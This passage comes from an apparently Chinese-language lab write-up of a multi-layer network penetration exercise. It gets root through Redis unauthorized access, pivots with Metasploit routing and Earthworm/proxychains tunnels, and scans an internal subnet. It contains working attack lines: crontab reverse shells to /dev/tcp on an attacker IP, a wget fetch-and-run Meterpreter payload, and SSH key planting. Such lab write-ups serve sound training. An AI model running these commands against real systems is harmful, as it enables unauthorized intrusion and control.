style="zoom:50%;"><p>save的时候报错。利用失败。可能是因为权限问题。</p><p>为了实验顺利进行，web1这台靶机的redis服务应该以root权限启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> redis-server /etc/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2）在-var-spool-cron-crontabs-root写入计划任务（失败）"><a href="#2）在-var-spool-cron-crontabs-root写入计划任务（失败）" class="headerlink" title="2）在/var/spool/cron/crontabs/root写入计划任务（失败）"></a>2）在/var/spool/cron/crontabs/root写入计划任务（失败）</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/crontabsconfig <span class="token builtin class-name">set</span> dbfilename root<span class="token builtin class-name">set</span> xxxxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.06.13.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.09.36.png" style="zoom:50%;"><p>攻击端并没有接收到shell。</p><h4 id="3）在-etc-crontab写入计划任务"><a href="#3）在-etc-crontab写入计划任务" class="headerlink" title="3）在/etc/crontab写入计划任务"></a>3）在/etc/crontab写入计划任务</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /etcconfig <span class="token builtin class-name">set</span> dbfilename <span class="token function">crontab</span><span class="token builtin class-name">set</span> xxxxx <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>* * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.43.26/8888 0&gt;&amp;1 <span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.11.24.png" style="zoom:40%;"><p>攻击端没有接收到回连的shell。</p><h3 id="5-3-2-上传ssh公钥"><a href="#5-3-2-上传ssh公钥" class="headerlink" title="5.3.2 上传ssh公钥"></a>5.3.2 上传ssh公钥</h3><p>将公钥写入key.txt文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /root/.ssh<span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span><span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> /root/key.txt<span class="token function">cat</span> /root/key.txt <span class="token operator">|</span>./redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.43.253 <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> pubredis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.52.4config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.sshconfig <span class="token builtin class-name">set</span> dbfilename authorized_keyssave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.23.29.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.29.32.png" style="zoom:40%;"><p>bingo！成功获取到web1靶机的root权限。</p><h2 id="5-4-信息收集"><a href="#5-4-信息收集" class="headerlink" title="5.4 信息收集"></a>5.4 信息收集</h2><p>拿下的这台192.168.43.253的服务器，还有另外一个ip 192.168.52.10。</p><p>之前通过Laravel RCE+容器逃逸拿下的那台机子是ubuntu14.04的系统，两块网卡的ip分别是192.168.52.20和192.168.93.10。但我们之前访问Laravel web服务的时候，ip是192.168.43.253，分析43.253这台机器是一个反向代理服务器。</p><blockquote><h4 id="Nginx-的-conf-d-目录用途及与-nginx-conf-的关系："><a href="#Nginx-的-conf-d-目录用途及与-nginx-conf-的关系：" class="headerlink" title="Nginx 的 conf.d 目录用途及与 nginx.conf 的关系："></a>Nginx 的 <code>conf.d</code> 目录用途及与 <code>nginx.conf</code> 的关系：</h4><p><code>/etc/nginx/conf.d</code> 目录用于存储额外的配置文件，这些配置文件通常包含针对特定站点或服务的配置，使得 Nginx 的主配置文件更加简洁和模块化。具体用途如下：</p><ul><li><p><strong>模块化配置</strong>：<code>/etc/nginx/conf.d</code> 目录用于存储额外的配置文件，每个文件通常以 <code>.conf</code> 结尾，例如 <code>default.conf</code>。这种模块化配置方式使得每个配置文件可以独立配置特定的站点或服务，从而让主配置文件更加简洁和易于管理。</p></li><li><p><strong>包含机制</strong>：Nginx 的主配置文件 <code>/etc/nginx/nginx.conf</code> 通常会包含 <code>/etc/nginx/conf.d</code> 目录下的所有配置文件，使用 <code>include</code> 指令。例如：</p><p>nginx复制</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>    <span class="token directive"><span class="token keyword">include</span> /etc/nginx/conf.d/*.conf</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样，Nginx 在启动时会按照文件名的字母顺序加载 <code>/etc/nginx/conf.d</code> 目录下的所有配置文件，并将它们合并成一个完整的配置。</p></li></ul></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/nginx/nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.40.26.png" style="zoom:50%;"><p>主配置文件还包含了conf.d下的子配置文件。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.41.47.png" style="zoom:40%;"><blockquote><h4 id="配置解析："><a href="#配置解析：" class="headerlink" title="配置解析："></a>配置解析：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">{</span>    listen <span class="token number">81</span><span class="token punctuation">;</span>             <span class="token comment"># 监听端口 81，这意味着 Nginx 将在这个端口上接收进来的 HTTP 请求。</span>    server_name localhost<span class="token punctuation">;</span> <span class="token comment"># 指定服务器名称为 localhost，这通常用于本地开发和测试环境。</span>    location / <span class="token punctuation">{</span>           <span class="token comment"># 定义 location 块，它决定了如何处理对服务器根路径（即以 / 开始的路径）的请求。</span>        proxy_pass http://192.168.52.20:8000<span class="token punctuation">;</span> <span class="token comment"># 将请求转发到内部网络的 192.168.52.20 服务器的 8000 端口。</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>到目前为止我们已经拿下了：</p><ul><li>DMZ区的一台服务器（192.168.43.253，192.168.52.10）</li><li>二层网络的一台服务器（192.168.52.20，192.168.93.10）</li></ul><h1 id="六、隧道搭建（二层网络渗透）"><a href="#六、隧道搭建（二层网络渗透）" class="headerlink" title="六、隧道搭建（二层网络渗透）"></a>六、隧道搭建（二层网络渗透）</h1><p>目前攻击机只能ping通DMZ区的主机，无法ping通二层网络（192.168.52.20/24）的主机。如何把我们的工具带入内网呢？比如如何直接拿kali上的nmap扫192.168.52.0/24网段的主机？这就要用到隧道搭建技术了。</p><p>关于EW和proxychains的使用方法，可以参考本站的《Earthworm-隧道搭建》一文。</p><h2 id="6-1-通过设置路由将msfconsole带入内网使用"><a href="#6-1-通过设置路由将msfconsole带入内网使用" class="headerlink" title="6.1 通过设置路由将msfconsole带入内网使用"></a>6.1 通过设置路由将msfconsole带入内网使用</h2><p>虽然通过获取web1和web2的metepreter的shell，然后通过路由设置可以将msfconsole带入内网（但是其他的工具想要带入内网还是要搭建隧道）。</p><p>使用 msf exploit/multi/script/web_delivery模块创建反弹shell的payload，投递到DMZ受控主机中。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.43.26<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> SRVPORT <span class="token number">9090</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在web1中执行下面的命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> xDfaOgFL --no-check-certificate http://192.168.43.26:9090/plurgt4DqlP<span class="token punctuation">;</span> <span class="token function">chmod</span> +x xDfaOgFL<span class="token punctuation">;</span> ./xDfaOgFL<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.54.38.png" alt="截屏2025-01-15 15.54.38"></p><p> 执行之后上线meterpreter：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.55.00.png" style="zoom:40%;"><p>设置路由：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.56.25.png" style="zoom:50%;"><p>通过添加路由可以将msfconsole路由到内网中。将msfconsole的流量从sessions 1路由到192.168.52.0/24网段。</p><p>我们尝试使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.1-255<span class="token builtin class-name">set</span> threads <span class="token number">5</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.03.09.png" alt="截屏2025-01-15 16.03.09" style="zoom:50%;"><p>​       成功探测到一台计算机：192.168.52.30.</p><h2 id="6-2-攻击机通过EW隧道直接探测二层网络"><a href="#6-2-攻击机通过EW隧道直接探测二层网络" class="headerlink" title="6.2 攻击机通过EW隧道直接探测二层网络"></a>6.2 攻击机通过EW隧道直接探测二层网络</h2><p>虽然通过路由设置可以将msfconsole带入内网，但是其他的工具想要带入内网还是要搭建隧道。</p><h3 id="6-2-1-环境梳理"><a href="#6-2-1-环境梳理" class="headerlink" title="6.2.1 环境梳理"></a>6.2.1 环境梳理</h3><p>从攻击者的视角看，目前的网络环境大致如下：</p><p>【攻击机192.168.43.26】——&gt;【DMZ 192.168.43.253｜192.168.52.10)】——&gt;【二层 192.168.52.20｜192.168.93.10】</p><p>这里是在本机搭建的环境，在实际攻击场景中攻击机一般是互联网上一台拥有公网ip的VPS，DMZ对外的IP也是互联网IP。</p><p>需求：建立攻击机和二层主机的隧道，实现直接在攻击机中使用nmap对二层网络中的主机进行扫描。</p><h3 id="6-2-2-攻击机执行ew客户端"><a href="#6-2-2-攻击机执行ew客户端" class="headerlink" title="6.2.2 攻击机执行ew客户端"></a>6.2.2 攻击机执行ew客户端</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><ul><li><code>-s rcsocks</code>：指定使用 <code>rcsocks</code> 模式。<code>rcsocks</code> 模式是 Earthworm 的 SOCKS 代理模式，它创建一个 SOCKS 服务器，该服务器接收来自客户端的连接，并将这些连接转发到远程的 SOCKS 服务器。</li><li><code>-l 1080</code>：指定本地监听端口为 1080。这意味着 Earthworm 将在本地计算机的 1080 端口上监听进来的 SOCKS 代理请求。</li><li><code>-e 1234</code>：指定远程 SOCKS 服务器的端口为 1234。这意味着所有通过本地 SOCKS 服务器（监听在 1080 端口）的流量都将被转发到远程 SOCKS 服务器的 1234 端口。</li></ul></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.04.59.png" style="zoom:50%;"><h3 id="6-2-3-DMZ受控主机执行ew服务端（web1）"><a href="#6-2-3-DMZ受控主机执行ew服务端（web1）" class="headerlink" title="6.2.3 DMZ受控主机执行ew服务端（web1）"></a>6.2.3 DMZ受控主机执行ew服务端（web1）</h3><blockquote><p>上传ew_for_linux64</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.40.28.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> Desktop/ew_for_linux64 root@192.168.43.253:/home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.06.10.png" style="zoom:50%;"><p>由于已经获得了ssh root权限，所以这里可以直接用scp复制文件到目标系统中。</p><blockquote><p>并执行如下命令：</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.43.26 <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>命令详解：</p><ul><li><code>-s rssocks</code>：指定使用 <code>rssocks</code> 模式。<code>rssocks</code> 模式用于创建一个 SOCKS 服务端，它将接收来自远程 SOCKS 客户端的连接，并将这些连接转发到本地的特定端口。</li><li><code>-d 192.168.1.7</code>：指定目标主机的 IP 地址为 <code>192.168.1.7</code>。这意味着 Earthworm 将尝试连接到这个 IP 地址上的 SOCKS 客户端。</li><li><code>-e 1234</code>：指定本地转发端口为 1234。这意味着所有通过远程 SOCKS 客户端的流量都将被转发到本地的 1234 端口。</li></ul></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.42.40.png" style="zoom:50%;"><h3 id="6-2-4-攻击机设置proxychains"><a href="#6-2-4-攻击机设置proxychains" class="headerlink" title="6.2.4 攻击机设置proxychains"></a>6.2.4 攻击机设置proxychains</h3><blockquote><h4 id="什么是proxychains"><a href="#什么是proxychains" class="headerlink" title="什么是proxychains"></a>什么是proxychains</h4><p>Proxychains 是一个非常有用的工具，它允许你通过一个或多个代理服务器来运行你的应用程序。它通过劫持应用程序的网络请求，并将这些请求通过配置的代理链发送出去，从而实现网络流量的代理。</p><p>ProxyChains是Linux和其他Unices下的代理工具。它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。</p><p>设置ProxyChains的具体操作步骤如下所示：</p><p>1）打开ProxyChains配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）添加代理服务器</p><p>在配置文件中，找到 <code>[ProxyList]</code> 部分，并添加你的代理服务器信息。以下是一些示例配置：</p><p><strong>SOCKS5 代理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.100 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>HTTP 代理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">http 192.168.1.101 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SOCKS4 代理</strong>：</p><pre class="line-numbers language-none"><code class="language-none">socks4 192.168.1.102 9050<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你可以添加多个代理，Proxychains 会根据配置的规则使用这些代理。</p><p>3）配置代理链模式</p><p>在配置文件的顶部，你可以选择不同的代理链模式：</p><p>动态链 (<code>dynamic_chain</code>)**：Proxychains 将按顺序尝试每个代理，直到找到一个工作的代理。</p><p>**严格链 (<code>strict_chain</code>)**：Proxychains 将按顺序尝试每个代理，如果一个代理失败，它将停止尝试。</p><p>例如，要启用动态链模式，你可以在配置文件的顶部添加或确保以下行未被注释（即没有 <code>#</code> 在行首）：</p><pre class="line-numbers language-none"><code class="language-none">dynamic_chain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）保存并退出编辑器</p><p>保存更改并退出编辑器。如果你使用的是 <code>nano</code>，可以按 <code>Ctrl + X</code>，然后按 <code>Y</code> 确认保存更改，最后按 <code>Enter</code> 保存文件。</p><p>5）使用 Proxychains</p><p>现在，你可以通过在命令前加上 <code>proxychains</code> 来使用 Proxychains。例如，使用 <code>proxychains</code> 运行 <code>curl</code> 命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将通过你配置的代理服务器发送请求。</p></blockquote><p>修改之前的配置：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.09.08.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.57.png" alt="原配置" style="zoom:50%;"><p>修改后的配置：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.56.34.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.09.49.png" style="zoom:50%;"><p>之后便可以使用proxychains将我们攻击机上的程序代理进第二层网络（192.168.52.1/24）了。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.10.59.png" alt="截屏2025-01-15 17.10.59" style="zoom:50%;"><p>正常情况下ping内网主机是无法ping通的，但是proxychains不支持icmp协议，所以也没法使用诸如proxychains4 ping 192.168.52.20的命令测试连通性。</p><h3 id="6-2-5-攻击机使用proxychains执行namp"><a href="#6-2-5-攻击机使用proxychains执行namp" class="headerlink" title="6.2.5 攻击机使用proxychains执行namp"></a>6.2.5 攻击机使用proxychains执行namp</h3><p>使用proxychains代理攻击机的流量，实现对二层网络的探测：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-F</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.52.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="大战Bug-「proxychains4-nmap-报错」"><a href="#大战Bug-「proxychains4-nmap-报错」" class="headerlink" title="大战Bug-「proxychains4 nmap  报错」"></a>大战Bug-「proxychains4 nmap  报错」</h4><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.15.21.png" style="zoom:40%;"><p>解决：</p><p>编辑 /etc/proxychains4.conf</p><p>注释掉dns解析代理</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.11.13.png" alt="截屏2025-01-15 16.11.13" style="zoom:50%;"></blockquote><p>​     重新执行扫描：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.16.08.png" style="zoom:50%;"><p>​      扫描结果：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.17.06.png" style="zoom:50%;"><p>​     至此，成功实现借助隧道使用kali的攻击工具探测二层网络内系统信息。</p><p>​     流量路径大致如下：</p><p>kali（nmap）192.168.43.26——&gt;127.0.0.1:8080——&gt;192.168.43.253:1234——&gt;192.168.52.10——&gt;192.168.52.30</p><blockquote><h4 id="切换热点之后靶场网络环境的调整"><a href="#切换热点之后靶场网络环境的调整" class="headerlink" title="切换热点之后靶场网络环境的调整"></a>切换热点之后靶场网络环境的调整</h4><p>后面换了一个热点环境，WIFI网段变成了172.20网段。做了以下调整，调整后的各层网络的主机IP地址如下：</p><p>mac宿主机：【IP：172.20.10.3/28 ，网关：172.20.10.1】</p><p>攻击机kali：【IP：172.20.10.4/28 ，网关：172.20.10.1】</p><p>DMZ区-web1：【IP1:172.20.10.5/28，网关：172.20.10.1】【IP2保持不变：192.168.52.10 网关192.168.52.1 】</p><p>其他设置保持不变就行了。</p><p>其实改变热点仅仅影响到了桥接模式的网卡，跟其他网卡无关。如果深入了解了VMware虚拟化网络的底层逻辑，应该不难理解。可以参考文站的这篇文章《三层网络域渗透靶场（WHOAMII）搭建》</p><p>修改配置之后反弹shell无法连通，web2主机无法ping通172.20.10.1/28。</p><p>分析是路由配置的问题：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.03.36.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.20</span>.0.0/16 dev br-1d665e13ee58  proto kernel  scope <span class="token function">link</span>  src <span class="token number">172.20</span>.0.1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析可能是这行路由配置影响了数据包的路由。</p><p>所有发往 172.20.0.0/16 网段（包括 172.20.10.0/28）的数据包，都将通过名为 br-1d665e13ee58 的虚拟网络接口发送，并且这些数据包的源地址将被设置为 172.20.0.1。这个路由只在本地链路上有效。所以从web2到172.20.10.0/28的流量没有出去。</p><p>我想解决方法有二，要么是加路由如下，要么是删除冲突的路由配置：</p><ul><li>方法1:</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ip</span> route <span class="token function">add</span> <span class="token number">172.20</span>.10.0/28 via <span class="token number">192.168</span>.52.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.09.30.png" style="zoom:50%;"><p>成功ping通。</p><p>其实在真实环境中，DMZ区外侧的互联网地址、攻击者的VPS都是互联网IP，如果二层网络能访问互联网的话自然也能访问到攻击者的VPS。在这里可以把172.20.10.0/28网段当作是互联网网段，192.168.52.1是二层网络访问互联网的网关。</p><ul><li>方法2:</li></ul><p>看一下当前运行的容器的网络环境</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> inspect 8e17 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.21.08.png" style="zoom:50%;"><p>没有用到172.20网段。开删！</p><p>先把刚刚设置的路由删掉：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ip</span> route del <span class="token number">172.20</span>.10.0/28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.17.24.png" style="zoom:50%;"><p>删除冲突的172.20网段的路由：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.18.04.png" style="zoom:50%;"><p>能ping通，果不其然是这条冲突路由的问题。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2014.18.48.png" style="zoom:50%;"><p>配置网络的奇奇怪怪的经验又增加了。</p><p>二层网络ping kali的路径梳理：</p><p>ping 172.20.10.4–&gt;走默认路由到–&gt;192.168.52.1–&gt;通过NAT到宿主机的网关–&gt;172.20.10.1–&gt;172.20.20.4成功访问到kali。所以反弹shell的路径也就通了。</p></blockquote><p>内网二层网络端口扫描结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.52.30Host is up <span class="token punctuation">(</span><span class="token number">0</span>.011s latency<span class="token punctuation">)</span>.Not shown: <span class="token number">989</span> closed portsPORT     STATE SERVICE      VERSION<span class="token number">110</span>/tcp  <span class="token function">open</span>  pop3<span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds Microsoft Windows <span class="token number">7</span> - <span class="token number">10</span> microsoft-ds <span class="token punctuation">(</span>workgroup: WHOAMIANONY<span class="token punctuation">)</span><span class="token number">1025</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1026</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1027</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1057</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1059</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">1061</span>/tcp <span class="token function">open</span>  msrpc        Microsoft Windows RPC<span class="token number">8080</span>/tcp <span class="token function">open</span>  http         nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-3-二层网络资源访问"><a href="#6-3-二层网络资源访问" class="headerlink" title="6.3 二层网络资源访问"></a>6.3 二层网络资源访问</h2><h3 id="6-3-1-8080端口"><a href="#6-3-1-8080端口" class="headerlink" title="6.3.1 8080端口"></a>6.3.1 8080端口</h3><p>尝试直接从kali攻击机访问内网的主机的8080端口。</p><p>配置firefox的socks代理：</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2018.05.34.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-16%2018.08.05.png" style="zoom:40%;"><p>成功访问到二层网络主机的web服务，是一个通达OA系统。</p><h4 id="流量路径："><a href="#流量路径：" class="headerlink" title="流量路径："></a>流量路径：</h4><p>Kali172.20.10.4 